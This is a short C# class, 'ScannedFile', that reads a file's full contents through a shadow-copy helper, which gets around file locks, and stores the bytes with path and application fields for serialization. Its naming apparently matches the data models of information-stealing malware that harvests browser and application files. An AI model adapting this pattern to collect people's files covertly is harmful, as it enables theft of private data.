using System.IO;
using System.Runtime.Serialization;

namespace WindowsSDK.Objects.Info
{
    [DataContract(Name = "ScannedFile", Namespace = "BrowserExtension")]
    public class ScannedFile
    {
        [DataMember(Name = "PathOfFile")]
        public string PathOfFile { get; set; }

        [DataMember(Name = "NameOfFile")]
        public string NameOfFile { get; set; }

        [DataMember(Name = "Body")]
        public byte[] Body { get; set; }

        [DataMember(Name = "NameOfApplication")]
        public string NameOfApplication { get; set; }

        [DataMember(Name = "DirOfFile")]
        public string DirOfFile { get; set; }

        public ScannedFile()
        {
        }

        public ScannedFile(string filename)
        {
            NameOfFile = new FileInfo(filename).Name;
            using FileCopier fileCopier = new FileCopier();
            Body = File.ReadAllBytes(fileCopier.CreateShadowCopy(filename));
        }
    }
}
